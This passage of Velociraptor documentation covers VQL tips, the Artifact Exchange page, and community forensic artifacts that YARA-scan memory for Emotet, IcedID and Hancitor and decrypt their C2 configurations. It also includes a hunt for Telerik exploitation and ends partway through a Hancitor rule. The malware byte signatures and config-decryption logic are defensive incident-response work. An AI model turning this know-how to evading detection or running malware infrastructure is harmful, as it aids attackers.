Upon startup, Velociraptor will run the workers linked to the organization, so you can find a trace of it in the logs, but you may only see it in GUI if you are granted permissions on it. Just edit with your favorite text editor: `<file store>/orgs/<org id>/acl/<username>.json.db` to give the access rights to an existing user (or create a user with the name of a user who was allowed to see the org),

{{% /notice %}}

Tags: #archiving #orgs #deployment 

---END OF FILE---

======
FILE: /content/knowledge_base/tips/set_operations.md
======
# Set operations in VQL

Set operations are useful in a number of useful scenarios.

## What are sets?

Sets are a mathematical construct that allows `set operations` on
groups of values. In VQL sets are analogous to dictionaries with the
key being the set member and the values ignored (usually just set to
`TRUE`). Set operations are emulated using dict addition and
subtraction.

For example consider the following VQL

```sql

// Convert a list into a dict for set operations
LET SET(LIST) = to_dict(item={
  SELECT _value AS _key, TRUE AS _value FROM foreach(row=LIST)
})

// Convert a dict into a list of keys
LET KEYS(X) = items(item=X)._key

LET X <= SET(LIST=["A", "B"])
LET Y <= SET(LIST=["A", "C"])

SELECT X + Y AS Union,
       KEYS(X=X+Y) AS UnionKeys,
       X - Y AS Intersection,
       KEYS(X=X-Y) AS IntersectionKeys,
       X.A AS Membership,
       get(field="A", item=X) AS Membership2
FROM scope()
```

In the above example, we define a helper function `SET()` to create a
dict from an array by iterating over each element of the array, and
setting the value to TRUE.

A `Set Union` operation is the combination of all keys in the first
set and the second set. This is achieved by adding the
dicts. Similarly a `Set Difference` removes keys present in the second
set from the first set. This is implemented by subtracting the second
set from the first set.

Set membership check can be done by simply checking if the dict
contains the value. This can be done directly when the key name is
known in advance, or by using the `get()` function to access the named
field.

![Set Operations in VQL](set_operations.png)

## Using Set operations in VQL

An example use case is in responding to a number of distinct artifact
collections. For example, for post processing the results of some
collections.

Generally to respond to server events we need to write a
`SERVER_EVENT` artifact that watches for certain events on the
server. In this case we watch for events from the
`System.Flow.Completion` artifact, this artifact emits the flow object
from each flow containing a list of `artifacts_with_results`.

```vql
LET SET(LIST) = to_dict(item={
  SELECT _value AS _key, TRUE AS _value FROM foreach(row=LIST)
})

LET FlowsToWatch <= SET(LIST=["Generic.Client.Info/Users",
   "Generic.Client.Info/WindowsInfo"])

SELECT Flow
FROM watch_monitoring(artifact="System.Flow.Completion")
WHERE any(items=Flow.artifacts_with_results, filter="x=>get(item=FlowsToWatch, field=x)")
```

The above query prepares a set into the variable `FlowsToWatch`. The
query then filters out all flows except those that contain results
from the set of interest.

An alternative to the previous query is to use a regular expression
(This solution is more flexible as it allows matching artifact names
by regular expressions):

```vql
LET FlowsToWatch <= join(array=["Generic.Client.Info/Users",
   "Generic.Client.Info/WindowsInfo"], sep="|")

SELECT Flow
FROM watch_monitoring(artifact="System.Flow.Completion")
WHERE Flow.artifacts_with_results =~ FlowsToWatch
```

This works because a regular expression match on an array is true if
any of the members of the array match.


Tags: #vql

---END OF FILE---

======
FILE: /content/knowledge_base/tips/reconfigure_offline_collector.md
======
# How can I quickly reconfigure an offline collector?

The offline collector is a pre-configured version of Velociraptor that automatically collects certain artifacts when invoked with no command line args. The offline collector is a full Velociraptor binary that simply has a custom configuration embedded - so you can use the collector binary to perform any operations that Velociraptor would.

Usually the collector is built using the GUI by selecting the correct artifacts and injecting parameters into the embedded configuration file. But sometimes we might want to slightly modify the embedded configuration, and firing up a GUI to rebuild a new collector from scratch is a bit too much work.

There is actually an easier way to quickly modify the embedded configuration. 

1. First extract the existing embedded config from the collector into a local file:

```
Collector_velociraptor-v0.6.4-windows-amd64.exe config show > config.yaml
```

2. Next we can edit the config file - for example, if we need to tweak the parameters
3. Finally we repack the new configuration file into the existing collector:

```
Collector_velociraptor-v0.6.4-windows-amd64.exe config repack config.yaml new_collector.exe
```

You can verify the new collector has the modified configuration using `new_collector.exe config show`

This method is suitable for small changes in the embedded configuration - it is always more reliable to use the GUI to prepare a completely new collector, but for small tweaks this method may be quicker.

---END OF FILE---

======
FILE: /content/exchange/_index.md
======
---
menutitle: "Artifact Exchange"
title: "Artifact Exchange"
date: 2021-06-12T14:03:59Z
draft: false
weight: 150
pre: <i class="fas fa-code"></i>
no_edit: true
disableToc: true
no_children: true
rss_data_file: static/exchange/data.json
rss_title: Velociraptor Artifact Exchange
noDisqus: true
outputs:
- html
- RSS
---

The artifact exchange is a place for sharing community contributed
artifacts. Simply search below for an artifact that might address
your need. If you wish to contribute to the exchange, please click the
button to the right.

{{% notice tip "Importing the artifact exchange" %}}

You can automatically import the entire content of the artifact
exchange into your server by running the
`Server.Import.ArtifactExchange` artifact.

Alternatively, download the [artifact
pack](https://github.com/Velocidex/velociraptor-docs/raw/gh-pages/exchange/artifact_exchange_v2.zip),
and manually upload them in the GUI (navigate to `View Artifacts` and
click the `Upload Artifact Pack` button)

{{% /notice %}}


{{% notice warning "Security of the exchange" %}}

The artifact exchange is not officially supported by the Velociraptor
team and contains contributions from the community. The quality,
security and stability of artifacts from the exchange **is not
guaranteed**. Some artifacts from the exchange will fetch external
binaries and run them on your endpoints! These binaries are **not
reviewed or endorsed** by the Velociraptor team or Rapid7!

Contributions to the exchange must meet a lower quality bar than built
in artifacts (for example lacking tests), which means that they may
break at any time or not work as described!

Collecting any of the artifacts in the exchange **is purely at your
own risk!**.

**We strongly suggest users review exchange artifacts
carefully before deploying them on their network!**

{{% /notice %}}


{{% exchange %}}

---END OF FILE---

======
FILE: /content/exchange/legacy/Windows.Carving.Emotet.yaml
======
name: Windows.Carving.Emotet
author: "Eduardo Mattos - @eduardfir"
description: |
    This artifact yara-scans memory or unpacked DLL samples for the new 2021 Emotet
    detections, decrypts and returns the C2 list.

    You may select specific file paths or processes to be yara-scanned, or allow
    it to yara-scan all memory space.

    Currently this artifact parses encrypted configurations from the Emotet variants
    introducted in November 2021. It will not parse the configurations from earlier
    variants.

    NOTE:
    This content simply carves the configuration and does not unpack files on disk.
    That means pointing this artifact as a packed or obfuscated file will not obtain the expected results.
type: CLIENT

reference:
  - https://github.com/kevoreilly/CAPEv2/blob/3fc7e94e22b5e4a04531292c095ea6db44879e72/data/yara/CAPE/Emotet.yar
  - https://github.com/OALabs/Lab-Notes/blob/main/Emotet/Emotet.ipynb

parameters:
  - name: TargetFileGlob
    default:
  - name: PidRegex
    default: .
  - name: ProcessRegex
    default: .
  - name: DetectionYara
    default: |
        rule Emotet {
            meta:
                author = "Eduardo Mattos"
                description = "Emotet Payload - Based on kevoreilly's Emotet Payload Yara rule"
                reference = "https://github.com/kevoreilly/CAPEv2/blob/master/modules/processing/parsers/mwcp/Emotet.py"
            strings:
                $snippetD = {8D 44 [2] 50 68 [4] FF 74 [2] FF 74 [2] 8B 54 [2] 8B 4C [2] E8 [4] 8B 54 [2] 83 C4 10 89 44 [2] 8B F8 03 44 [2] B9 [4] 89 44 [2] E9 [2] FF FF}
                $snippetE = {FF 74 [2] 8D 54 [2] FF 74 [2] 68 [4] FF 74 [2] 8B 4C [2] E8 [4] 8B 54 [2] 83 C4 10 89 44 [2] 8B F8 03 44 [2] B9 [4] 89 44 [2] E9 [2] FF FF}
                $snippetF = {FF 74 [2] 8D 44 [2] BA [4] FF 74 [2] 8B 4C [2] 50 E8 [4] 8B 54 [2] 8B D8 8B 84 [5] 83 C4 0C 03 C3 89 5C [2] 8B FB 89 44}
                $snippetG = {FF 74 [2] 8B 54 [2] 8D 44 [2] 8B 4C [2] 50 E8 [4] 8B D0 83 C4 0C 8B 44 [2] 8B FA 03 C2 89 54 [2] 89 44}
                $snippetH = {FF 74 [2] 8D 84 [5] 68 [4] 50 FF 74 [2] 8B 54 [2] 8B 4C [2] E8 [4] 8B 94 [5] 83 C4 10 89 84 [5] 8B F8 03 84}
                $snippetI = {FF 74 [2] 8D 8C [5] FF 74 [2] 8B 54 [2] E8 [4] 8B 54 [2] 8B D8 8B 84 [5] 83 C4 0C 03 C3 89 5C [2] 8B FB 89 44 24 74}
                $snippetJ = {FF 74 [2] 8B 4C [2] 8D 44 [2] 50 BA [4] E8 [4] 8B 54 [2] 8B F8 59 89 44 [2] 03 44 [2] 59 89 44 [2] B9 [4] E9}
                $snippetK = {FF 74 [2] FF 74 [2] 8B 54 [2] E8 [4] 8B 54 [2] 83 C4 0C 89 44 [2] 8B F8 03 44 [2] B9 [4] 89 44 [2] E9}
                $snippetL = {FF 74 [2] 8B 54 [2] 8D 4C [2] E8 [4] 59 89 44 [2] 8B F8 03 44 [2] 59 89 44 24 68 B9 [4] E9}
                $snippetM = {FF 74 [2] 8D 84 [3] 00 00 B9 [4] 50 FF 74 [2] FF 74 [2] 8B 94 [3] 00 00 E8 [4] 83 C4 10 89 44 [2] 8B F8 B9 [4] 03 84 [3] 00 00 89 44 [2] E9}
                $snippetN = {FF 74 [2] 8D 44 [2] B9 [4] FF 74 [2] 50 FF 74 [2] 8B 54 [2] E8 [4] 8B 8C [3] 00 00 83 C4 10 03 C8 89 44 [2] 89 4C [2] 8B F8 B9 45 89 77 05 E9}
                $snippetO = {8D 44 [2] B9 [4] 50 FF 74 [2] 8B 54 [2] E8 [4] 8B D0 8B 44 [2] 59 59 03 C2 89 54 [2] 8B FA 89 44 [2] B9 [4] E9}
                $snippetP = {FF 74 [2] 8B 54 [2] 8D 44 [2] 8B 4C [2] 68 [4] 50 E8 [4] 8B D0 83 C4 0C 8B 44 [2] 8B FA 03 C2 89 54 [2] 8B 54 [2] B9 [4] 89 44 [2] E9}
                $snippetQ = {FF 74 [2] BA [4] 8D 4C [2] FF 74 [2] E8 [4] 59 89 84 [3] 00 00 8B F8 03 44 [2] 59 89 44 [2] B9 [4] 81 F9 [4] 74 28 8B 54 [2] E9}
                $snippetR = {8D 44 [2] 50 FF 74 [2] 8B 54 [2] 8B 4C [2] 68 [4] E8 [4] 8B D0 83 C4 0C 8B 44 [2] 8B FA 03 C2 89 54 [2] 8B 54 [2] B9 [4] 89 44 [2] E9}
                $snippetS = {FF 74 [2] 8D 54 [2] FF 74 [2] 8B 4C [2] E8 [4] 8B D0 83 C4 0C 8B 44 [2] 8B FA 03 C2 89 54 [2] 8B 54 [2] B9 [4] 89 44 [2] E9}
                $snippetT = {8B 54 [2] 8D 44 [2] 8B 4C [2] 68 [4] 50 E8 [4] 8B 9C [3] 00 00 8B F8 59 59 03 D8 89 44 [2] 89 5C [2] B9 [4] EB}
                $snippetU = {89 44 [2] 33 D2 8B 44 [2] F7 F1 B9 [4] 89 44 [2] 8D 44 [2] 81 74 [6] C7 44 [6] 81 44 [6] 81 74 [6] FF 74 [2] 50 FF 74 [2] FF 74 [2] 8B 54 [2] E8}
                $snippetV = {81 74 [2] ED BC 9C 00 FF 74 [2] 50 68 [4] FF 74 [2] 8B 54 [2] 8B 4C [2] E8}
            condition:
                any of them
        }
sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
        -- find target files
        LET targetFiles = SELECT FullPath FROM glob(globs=TargetFileGlob)

        -- find velociraptor process
        LET me <= SELECT Pid
                  FROM pslist(pid=getpid())

        -- find all processes and add filters
        LET processes <= SELECT Name AS ProcessName, CommandLine, Pid
                        FROM pslist()
                        WHERE Name =~ ProcessRegex
                            AND format(format="%d", args=Pid) =~ PidRegex
                            AND NOT Pid in me.Pid
                            
        -- scan processes in scope with our DetectionYara
        LET processDetections <= SELECT * FROM foreach(row=processes,
                                query={
                                    SELECT * FROM if(condition=TargetFileGlob="",
                                        then={
                                            SELECT *, ProcessName, CommandLine, Pid, Rule AS YaraRule
                                            FROM proc_yara(pid=Pid, rules=DetectionYara)
                                        })
                                })
                                
        -- scan files in scope with our DetectionYara
        LET fileDetections = SELECT * FROM foreach(row=targetFiles,
                                query={
                                    SELECT * FROM if(condition=TargetFileGlob,
                                        then={
                                            SELECT * FROM switch(
                                                a={ -- yara detection
                                                    SELECT FullPath, Rule AS YaraRule
                                                    FROM yara(files=FullPath, rules=DetectionYara)
                                                },
                                                b={ -- yara miss
                                                    SELECT FullPath, Null AS YaraRule
                                                    FROM targetFiles
                                                })
                                        },
                                        else={ -- no yara detection run
                                            SELECT FullPath, 'N/A' AS YaraRule
                                            FROM targetFiles
                                        })
                             })
                             
        -- return the VAD region size from yara detections for later use
        LET regionDetections = SELECT *
                                FROM foreach(row=processDetections,
                                    query={
                                        SELECT YaraRule, Pid, ProcessName, CommandLine, Address as EmotetBaseOffset, Size AS VADSize
                                        FROM vad(pid=Pid)
                                        WHERE Protection =~ "xrw"
                                })

        -- get data from the whole PE
        LET peData <= SELECT * FROM if(condition=TargetFileGlob,
                                        then={ -- query files
                                            SELECT YaraRule, FullPath,
                                                read_file(filename=FullPath) AS PEData
                                            FROM fileDetections
                                        },
                                        else={ -- query processes
                                            SELECT YaraRule, Pid, ProcessName, CommandLine,
                                                read_file(filename=str(str=Pid), accessor='process', offset=EmotetBaseOffset, length=VADSize) AS PEData
                                            FROM regionDetections
                                        })

        -- return .data section info
        LET sectionInfo <= SELECT *,
                                parse_pe(file=PEData, accessor="data").Sections[2] AS DataSections
                           FROM peData

        -- read the data from .data sections
        LET sectionData <= SELECT *,
                                read_file(filename=PEData, accessor="data", offset=DataSections.FileOffset, length=DataSections.Size) AS EmotetDataSectionData
                           FROM sectionInfo

        -- parse the .data sections to extract the C2 config
        LET parsedDataSection = SELECT *,
                            parse_binary(filename=EmotetDataSectionData, accessor="data", profile='''[
                                ["EmotetC2Config", 0, [
                                        ["Key", 0, "String", {"length": 4, "term":""}],
                                        ["SizeEncoded", 4, "String", {"length": 4, "term":""}],
                                        ["C2List", 8, "String", {"length":"x=> parse_binary(accessor='data',filename=xor(string=x.SizeEncoded, key=x.Key),struct='uint32')", "term":""}]
                                    ]
                                ]
                            ]''', struct="EmotetC2Config") AS EmotetEncodedC2Conf
                          FROM sectionData

        -- format the decrypted configurations
        SELECT * FROM if(condition=TargetFileGlob,
            then= {
                SELECT YaraRule, FullPath,
                    { SELECT ip(netaddr4_be=int(int="0x" + IPAdd)) AS IPAddress, int(int="0x" + Port) AS PortNum FROM parse_records_with_regex(file=format(format="%x", args=xor(string=EmotetEncodedC2Conf.C2List, key=EmotetEncodedC2Conf.Key)), accessor="data", regex='(?P<IPAdd>........)(?P<Port>....)....')} AS C2Info
                FROM parsedDataSection
            },
            else= {
                SELECT YaraRule, Pid, ProcessName, CommandLine,
                    { SELECT ip(netaddr4_be=int(int="0x" + IPAdd)) AS IPAddress, int(int="0x" + Port) AS PortNum FROM parse_records_with_regex(file=format(format="%x", args=xor(string=EmotetEncodedC2Conf.C2List, key=EmotetEncodedC2Conf.Key)), accessor="data", regex='(?P<IPAdd>........)(?P<Port>....)....')} AS C2Info
                FROM parsedDataSection
                GROUP BY Pid
        })

---END OF FILE---

======
FILE: /content/exchange/legacy/VAD.yaml
======
name: Windows.System.VAD
author: "Matt Green - @mgreen27"
description: |
  This artifact enables enumeration of process memory sections via the Virtual 
  Address Descriptor (VAD). The VAD is used by the Windows memory manager to 
  describe allocated process memory ranges.
  
  Availible filters include process, mapping path, memory permissions 
  or by content with yara.
  
  NOTE:  ProtectionChoice is a choice to filter on section protection. Default is 
  all sections and ProtectionRegex can override selection.   
  To filter on unmapped sections the MappingNameRegex: ^$ can be used.

parameters:
  - name: ProcessRegex
    description: A regex applied to process names.
    default: .
    type: regex
  - name: PidRegex
    default: .
    type: regex
  - name: ProtectionChoice
    type: choices
    description: Select memory permission you would like to return. Default All.
    default: Any
    choices:
      - Any
      - Execute, read and write
      - Any executable
  - name: ProtectionRegex
    type: regex
    description: Allows a manual regex selection of section Protection permissions. If configured take preference over Protection choice. 
  - name: MappingNameRegex
    type: regex
  - name: UploadSection
    description: Upload suspicious section.
    type: bool
  - name: SuspiciousContent
    description: A yara rule of suspicious section content 
    type: yara
  - name: ContextBytes
    description: Include this amount of bytes around yara hit as context.
    default: 10000
    type: int
    
    
sources:
  - query: |
      -- firstly find processes in scope
      LET processes = SELECT Pid, Name,Exe,CommandLine,CreateTime
        FROM pslist()
        WHERE Name =~ ProcessRegex
            AND format(format="%d", args=Pid) =~ PidRegex
            AND log(message="Scanning pid %v : %v", args=[Pid, Name])

      -- next find sections in scope
      LET sections = SELECT * FROM foreach(
          row=processes,
          query={
            SELECT CreateTime as ProcessCreateTime,Pid, Name,MappingName  ,
                format(format='%x-%x', args=[Address, Address+Size]) AS AddressRange,
                Protection, Address as _Address,
                Size as SectionSize,
                pathspec(
                    DelegateAccessor="process",
                    DelegatePath=Pid,
                    Path=Address) AS _PathSpec
            FROM vad(pid=Pid)
            WHERE if(condition=MappingNameRegex,
                    then= MappingName=~MappingNameRegex,
                    else= True)
                AND if(condition = ProtectionRegex,
                    then= Protection=~ProtectionRegex,
                    else= if(condition= ProtectionChoice='Any',
                        then= TRUE,
                    else= if(condition= ProtectionChoice='Execute, read and write',
                        then= Protection= 'xrw',
                    else= if(condition= ProtectionChoice='Any executable',
                        then= Protection=~'x'))))
          })
      
      -- if suspicious yara added, search for it
      LET yara_sections = SELECT *
        FROM foreach(row=sections,
            query={
                SELECT
                    ProcessCreateTime, Pid, Name,MappingName,
                    AddressRange,Protection,SectionSize,
                    enumerate(items=dict(
                        Rule=Rule,
                        Meta=Meta,
                      Tags=Tags,
                      String=String))[0] as YaraHit,
                    _PathSpec,_Address
                FROM yara(
                            accessor='offset',
                            files=_PathSpec, 
                            rules=SuspiciousContent,
                            end=SectionSize,  key='X', 
                            number=1,
                            context=ContextBytes
                        )
            })
      
      -- finalise results
      LET results = SELECT *, process_tracker_callchain(id=Pid).Data as ProcessChain
        FROM if(condition= SuspiciousContent,
                    then= yara_sections,
                    else= sections) 
      
      -- upload sections if selected        
      LET upload_results = SELECT *, 
                                upload(accessor='sparse', 
                                file=pathspec(
                                DelegateAccessor="process",
                                DelegatePath=Pid,
                                Path=[dict(Offset=_Address, Length=SectionSize),]), 
                                name=format(format='%v-%v_%v.bin',args= [ Name, Pid, AddressRange ])
                            ) as SectionDump
            FROM results
      
      -- output rows
      SELECT * FROM if(condition= UploadSection,
                    then= upload_results,
                    else= results)

---END OF FILE---

======
FILE: /content/exchange/legacy/Windows.Carving.IcedID.yaml
======
name: Windows.Carving.IcedID
author: "Eduardo Mattos - @eduardfir"
description: |
    This artifact yara-scans memory or unpacked DLL samples for IcedID trojan (also
    known as BokBot, or Anubis) detections, finds, decodes and returns the 
    Campaign ID and C2 configurations.

    You may select specific file paths or processes to be
    yara-scanned, or allow it to yara-scan all memory space.

    NOTE: This content simply carves the configuration and does not
    unpack files on disk.  That means pointing this artifact as a
    packed or obfuscated file will not obtain the expected results.

type: CLIENT

reference:
  - https://eln0ty.github.io/malware%20analysis/IcedID/?s=09#decrypt-config
  - https://github.com/kevoreilly/CAPEv2/blob/b167c22190ab6acf0f788865f9dd4c5c64d73f99/data/yara/CAPE/IcedIDLoader.yar
  
parameters:
  - name: TargetFileGlob
    default:
  - name: PidRegex
    default: .
  - name: ProcessRegex
    default: .
  - name: DetectionYara
    default: |
        rule IcedIDLoader {
            meta:
                author = "kevoreilly, threathive, enzo"
                description = "IcedID Loader"
                cape_type = "IcedID Loader"
            strings:
                $crypt1 = {8A 04 ?? D1 C? F7 D? D1 C? 81 E? 20 01 00 00 D1 C? F7 D? 81 E? 01 91 00 00 32 C? 88}
                $crypt2 = {8B 44 24 04 D1 C8 F7 D0 D1 C8 2D 20 01 00 00 D1 C0 F7 D0 2D 01 91 00 00 C3}
                $crypt3 = {41 00 8B C8 C1 E1 08 0F B6 C4 66 33 C8 66 89 4? 24 A1 ?? ?? 41 00 89 4? 20 A0 ?? ?? 41 00 D0 E8 32 4? 32}
                $crypt4 = {0F B6 C8 [0-3] 8B C1 83 E1 0F [0-1] C1 E8 04 [0-1] 0F BE [2-5] 66 [0-1] 89 04 [1-2] 0F BE [2-5] 66 [0-1] 89 44 [2-3] 83 [4-5] 84 C0 75}
                $crypt5 = {48 C1 E8 ?? 0F BE 44 05 ?? 66 89 04 5E 44 88 75 ?? C7 45 [5] C7 45 [5] C7 45 [5] C7 45 [5] 44 89 5D}
                $download1 = {8D 44 24 40 50 8D 84 24 44 03 00 00 68 04 21 40 00 50 FF D5 8D 84 24 4C 01 00 00 C7 44 24 28 01 00 00 00 89 44 24 1C 8D 4C 24 1C 8D 84 24 4C 03 00 00 83 C4 0C 89 44 24 14 8B D3 B8 BB 01 00 00 66 89 44 24 18 57}
                $download2 = {8B 75 ?? 8D 4D ?? 8B 7D ?? 8B D6 57 89 1E 89 1F E8 [4] 59 3D C8 00 00 00 75 05 33 C0 40 EB}
                $download3 = {B8 50 00 00 00 66 89 45 ?? 4C 89 65 ?? 4C 89 75 ?? E8 [4] 48 8B 1E 3D 94 01 00 00}
                $major_ver = {0F B6 05 ?? ?? ?? ?? 6A ?? 6A 72 FF 75 0C 6A 70 50 FF 35 ?? ?? ?? ?? 8D 45 80 FF 35 ?? ?? ?? ?? 6A 63 FF 75 08 6A 67 50 FF 75 10 FF 15 ?? ?? ?? ?? 83 C4 38 8B E5 5D C3}
                $decode = {4? 8D [5-6] 8A 4? [1-3] 32 }//0? 01 88 44 [2] 4?}
            condition:
                2 of them
        }
sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
        -- find target files
        LET targetFiles = SELECT FullPath FROM glob(globs=TargetFileGlob)

        -- find velociraptor process
        LET me <= SELECT Pid
                  FROM pslist(pid=getpid())

        -- find all processes and add filters
        LET processes <= SELECT Name AS ProcessName, CommandLine, Pid
                        FROM pslist()
                        WHERE Name =~ ProcessRegex
                            AND format(format="%d", args=Pid) =~ PidRegex
                            AND NOT Pid in me.Pid
                            
        -- scan processes in scope with our DetectionYara
        LET processDetections <= SELECT * FROM foreach(row=processes,
                                query={
                                    SELECT * FROM if(condition=TargetFileGlob="",
                                        then={
                                            SELECT *, ProcessName, CommandLine, Pid, Rule AS YaraRule
                                            FROM proc_yara(pid=Pid, rules=DetectionYara)
                                        })
                                })
                                
        -- scan files in scope with our DetectionYara
        LET fileDetections = SELECT * FROM foreach(row=targetFiles,
                                query={
                                    SELECT * FROM if(condition=TargetFileGlob,
                                        then= {
                                                SELECT FullPath, Rule AS YaraRule
                                                FROM yara(files=FullPath, rules=DetectionYara)
                                        },
                                        else={ -- no yara detection run
                                            SELECT FullPath, 'N/A' AS YaraRule
                                            FROM targetFiles
                                        })
                             })
                 
        -- return the VAD region size from yara detections for later use
        LET regionDetections = SELECT *
                                FROM foreach(row=processDetections,
                                    query={
                                        SELECT YaraRule, Pid, ProcessName, CommandLine, Address as IcedIDBaseOffset, Size AS VADSize
                                        FROM vad(pid=Pid)
                                        WHERE Protection =~ "xrw"
                                })

        -- get data from the whole PE
        LET peData <= SELECT * FROM if(condition=TargetFileGlob,
                                        then={ -- query files
                                            SELECT YaraRule, FullPath,
                                                read_file(filename=FullPath) AS PEData
                                            FROM fileDetections
                                        },
                                        else={ -- query processes
                                            SELECT YaraRule, Pid, ProcessName, CommandLine,
                                                read_file(filename=str(str=Pid), accessor='process', offset=IcedIDBaseOffset, length=VADSize) AS PEData
                                            FROM regionDetections
                                        })

        -- return .d section info
        LET sectionInfo <=  SELECT *
                            FROM foreach(row=peData,
                                query= { 
                                    SELECT YaraRule, 
                                        IcedIDSectionInfo, 
                                        PEData, 
                                        FullPath,
                                        Pid, 
                                        ProcessName, 
                                        CommandLine
                                    FROM foreach(row=parse_pe(file=PEData, accessor="data").Sections,
                                        query = {
                                            SELECT _value as IcedIDSectionInfo, 
                                                FullPath, 
                                                YaraRule, 
                                                PEData,
                                                Pid, 
                                                ProcessName, 
                                                CommandLine
                                            FROM scope()
                                            WHERE IcedIDSectionInfo.Name = ".d"
                                         })
                                    
                                })
        
        -- read the data from .d sections
        LET sectionData <=  SELECT * FROM if(condition=TargetFileGlob,
                                        then={ -- query files
                                            SELECT *,
                                                read_file(filename=PEData, accessor="data", offset=IcedIDSectionInfo.FileOffset, length=IcedIDSectionInfo.Size) AS IcedIDDSectionData
                                           FROM sectionInfo
                                        },
                                        else={ -- query processes
                                            SELECT *,
                                                read_file(filename=PEData, accessor="data", offset=IcedIDSectionInfo.RVA, length=IcedIDSectionInfo.Size) AS IcedIDDSectionData
                                           FROM sectionInfo
                                        })

        -- parse the .data sections to extract the C2 config
        LET parsedDSection = SELECT *,
                            parse_binary(filename=IcedIDDSectionData, accessor="data", profile='''[
                                ["IcedIDConfigStruct", 0, [
                                        ["Key", 0, "String", {"length": 32, "term":""}],
                                        ["Data", 64, "String", {"length": 32, "term":""}],
                                        ["DecodedConfig", 0, "Value", {value: "x=> xor(string=x.Data, key=x.Key)"}]
                                    ]
                                ]
                            ]''', struct="IcedIDConfigStruct") AS IcedIDConfig
                          FROM sectionData
                          
        LET formattedConfig <= SELECT *, 
                                parse_string_with_regex(string=format(format="%X", args=IcedIDConfig.DecodedConfig), regex='(?P<CampaignID>........)(?P<C2>.+)00') as DecodedConfig 
                               FROM parsedDSection

        -- format the decoded configurations
        SELECT * FROM if(condition=TargetFileGlob,
            then= {
                SELECT YaraRule, FullPath,
                    parse_binary(accessor='data',filename=unhex(string=DecodedConfig.CampaignID),struct='uint32') as CampaignID,
                    unhex(string=DecodedConfig.C2) as C2Address
                FROM formattedConfig
            },
            else= {
                SELECT YaraRule, Pid, ProcessName, CommandLine,
                    parse_binary(accessor='data',filename=unhex(string=DecodedConfig.CampaignID),struct='uint32') as CampaignID,
                    unhex(string=DecodedConfig.C2) as C2Address
                FROM formattedConfig
                GROUP BY Pid
        })

---END OF FILE---

======
FILE: /content/exchange/legacy/Telerik.yaml
======
name: Windows.EventLogs.Telerik
author: Matt Green - @mgreen27
description: |
  This Artifact will hunt for evidence of Telerik exploitation in the
  Application Event Log.

  Telerik is a commonly exploited component of IIS web pages that has
  been actively targeted by actors via several CVEs. Several tools and
  attack capabilities exist making exploitation of vulnerable services
  trivial. Due to the nature of the software and typical deployments
  the patches may require manual application.

  IocRegex enables searching for regex in the whole EventData field.
  Output of this artifact is targeted fields from EventID 1309 to
  provide context for the hit.

  This Artifact will hunt for evidence of Telerik exploitation in the
  Application Event Log.

reference:
  - https://www.cyber.gov.au/acsc/view-all-content/advisories/advisory-2020-004-remote-code-execution-vulnerability-being-actively-exploited-vulnerable-versions-telerik-ui-sophisticated-actors
  - https://attack.mitre.org/techniques/T1190/

parameters:
  - name: EvtxGlob
    default: '%SystemRoot%\System32\Winevt\Logs\Application.evtx'
  - name: IocRegex
    description: "IOC Regex"
    default: telerik.*\\?type=rau
  - name: WhitelistRegex
    description: "Regex of string to witelist"
  - name: SearchVSS
    description: "Add VSS into query."
    type: bool
  - name: DateAfter
    type: timestamp
    description: "search for events after this date. YYYY-MM-DDTmm:hh:ssZ"
  - name: DateBefore
    type: timestamp
    description: "search for events before this date. YYYY-MM-DDTmm:hh:ssZ"

sources:
  - precondition: SELECT OS From info() where OS = 'windows'

    query: |
      -- firstly set timebounds for performance
      LET DateAfterTime <= if(condition=DateAfter,
        then = DateAfter, else = "1600-01-01" )
      LET DateBeforeTime <= if(condition=DateBefore,
        then = DateBefore, else = "2200-01-01" )

      -- expand provided glob into a list of paths on the file system (fs)
      LET fspaths <= SELECT FullPath
        FROM glob(globs=expand(path=EvtxGlob))

      -- function returning list of VSS paths corresponding to path
      LET vsspaths(path) = SELECT FullPath
        FROM Artifact.Windows.Search.VSS(SearchFilesGlob=path)

      -- function returning IOC hits
      LET evtxsearch(PathList) = SELECT * FROM foreach(
            row=PathList,
            query={
                SELECT
                    timestamp(epoch=int(int=System.TimeCreated.SystemTime)) AS EventTime,
                    System.Computer as Computer,
                    System.Channel as Channel,
                    System.EventID.Value as EventID,
                    System.EventRecordID as EventRecordID,
                    EventData.Data[17] as Exception,
                    EventData.Data[16] as User,
                    EventData.Data[15] as Process,
                    EventData.Data[14] as Pid,
                    EventData.Data[21] as SourceIP,
                    EventData.Data[19] as Uri,
                    EventData.Data[11] as SitePath,
                    FullPath
                FROM parse_evtx(filename=FullPath)
                WHERE EventID = 1309
                    AND format(format='%v',args=EventData.Data) =~ IocRegex
                    AND NOT if(condition=WhitelistRegex,
                        then= format(format='%v',args=EventData.Data) =~ WhitelistRegex,
                        else= FALSE )
            }
          )

      -- include VSS in calculation and deduplicate with GROUP BY by file
      LET include_vss = SELECT * FROM foreach(row=fspaths,
            query={
                SELECT *
                FROM evtxsearch(PathList={
                        SELECT FullPath FROM vsspaths(path=FullPath)
                    })
                GROUP BY EventRecordID
              })

      -- exclude VSS in EvtxHunt`
      LET exclude_vss = SELECT *
        FROM evtxsearch(PathList={SELECT FullPath FROM fspaths})

      -- return rows
      SELECT * FROM if(condition=SearchVSS,
        then=include_vss,
        else=exclude_vss)

---END OF FILE---

======
FILE: /content/exchange/legacy/Windows.Carving.Hancitor.yaml
======
name: Windows.Carving.Hancitor
author: "Eduardo Mattos - @eduardfir"
description: |
    This artifact yara-scans memory or unpacked DLL samples for
    Hancitor trojan detections, decrypting and returning the Build ID
    and C2 list.

    You may select specific file paths or processes to be yara-scanned,
    or simply allow it to yara-scan all running processes (default)

    NOTE:
    This content simply carves the configuration and does not unpack
    files on disk.  That means pointing this artifact as a packed or
    obfuscated file will not obtain the expected results.

type: CLIENT

reference:
  - https://github.com/Yara-Rules/rules/blob/master/malware/MALW_hancitor.yar
  - https://github.com/OALabs/Lab-Notes/blob/main/Hancitor/hancitor.ipynb
  - https://github.com/kevoreilly/CAPEv2/blob/master/modules/processing/parsers/mwcp/Hancitor.py

parameters:
  - name: TargetFileGlob
    default:
  - name: PidRegex
    default: .
  - name: ProcessRegex
    default: .
  - name: DetectionYara
    default: |
        rule win_hancitor_auto {

            meta:
                author = "Felix Bilstein - yara-signator at cocacoding dot com"
                date = "2021-06-10"
                version = "1"
                description = "Detects win.hancitor."
                info = "autogenerated rule brought to you by yara-signator - Adapted for memory detection by Eduardo Mattos"
                tool = "yara-signator v0.6.0"
                signator_config = "callsandjumps;datarefs;binvalue"
